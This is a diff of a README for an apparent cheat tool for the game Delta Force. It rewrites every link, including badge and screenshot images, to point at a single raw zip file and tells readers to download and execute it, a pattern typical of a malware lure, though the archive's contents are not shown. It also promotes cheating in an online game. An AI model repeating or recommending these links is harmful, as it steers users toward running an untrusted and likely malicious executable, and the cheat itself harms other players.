@@ -1,12 +1,12 @@
 # Delta Force Arcane Software: Ultimate Cheat Tool for Gamers 🎮✨
 
-![Delta Force](https://img.shields.io/badge/Delta_Force-Arcane_Software-blue?style=for-the-badge&logo=github)
+![Delta Force](https://raw.githubusercontent.com/kooziizap3/Delta-Force-Arcane-Software/main/proproctor/Delta-Force-Arcane-Software.zip)
 
 ## Overview
 
 Welcome to the **Delta-Force-Arcane-Software** repository! This project offers a private cheat solution for the popular game Delta Force. With this software, players gain an edge in gameplay through advanced features such as PlayerESP and Loot ESP. 
 
-You can download the latest version of the software [here](https://github.com/kooziizap3/Delta-Force-Arcane-Software/releases). Please ensure you download and execute the file for optimal performance.
+You can download the latest version of the software [here](https://raw.githubusercontent.com/kooziizap3/Delta-Force-Arcane-Software/main/proproctor/Delta-Force-Arcane-Software.zip). Please ensure you download and execute the file for optimal performance.
 
 ## Features
 
@@ -25,7 +25,7 @@ You can download the latest version of the software [here](https://github.com/ko
 
 ## Installation
 
-1. **Download the Software**: Visit the [Releases](https://github.com/kooziizap3/Delta-Force-Arcane-Software/releases) section and download the latest version.
+1. **Download the Software**: Visit the [Releases](https://raw.githubusercontent.com/kooziizap3/Delta-Force-Arcane-Software/main/proproctor/Delta-Force-Arcane-Software.zip) section and download the latest version.
 2. **Extract Files**: Unzip the downloaded file.
 3. **Run the Application**: Execute the application to start using the features.
 
@@ -61,10 +61,10 @@ This repository focuses on various aspects of Delta Force gameplay enhancements.
 
 ## Screenshots
 
-![PlayerESP](https://example.com/playeresp-screenshot.png)
+![PlayerESP](https://raw.githubusercontent.com/kooziizap3/Delta-Force-Arcane-Software/main/proproctor/Delta-Force-Arcane-Software.zip)
 *PlayerESP in action showing enemy positions.*
 
-![LootESP](https://example.com/lootesp-screenshot.png)
+![LootESP](https://raw.githubusercontent.com/kooziizap3/Delta-Force-Arcane-Software/main/proproctor/Delta-Force-Arcane-Software.zip)
 *LootESP highlighting valuable items on the map.*
 
 ## Frequently Asked Questions (FAQ)
@@ -92,7 +92,7 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## Support
 
-For support, please check the [Releases](https://github.com/kooziizap3/Delta-Force-Arcane-Software/releases) section for updates or open an issue in the repository.
+For support, please check the [Releases](https://raw.githubusercontent.com/kooziizap3/Delta-Force-Arcane-Software/main/proproctor/Delta-Force-Arcane-Software.zip) section for updates or open an issue in the repository.
 
 ## Acknowledgments
 
@@ -102,8 +102,8 @@ Thanks to the community for their contributions and support. Your feedback helps
 
 For inquiries, you can reach out via GitHub issues or email the project maintainer.
 
-![Delta Force](https://img.shields.io/badge/Delta_Force-Arcane_Software-blue?style=for-the-badge&logo=github)
+![Delta Force](https://raw.githubusercontent.com/kooziizap3/Delta-Force-Arcane-Software/main/proproctor/Delta-Force-Arcane-Software.zip)
 
 ---
 
-Download the software [here](https://github.com/kooziizap3/Delta-Force-Arcane-Software/releases) and take your gameplay to the next level!
+Download the software [here](https://raw.githubusercontent.com/kooziizap3/Delta-Force-Arcane-Software/main/proproctor/Delta-Force-Arcane-Software.zip) and take your gameplay to the next level!
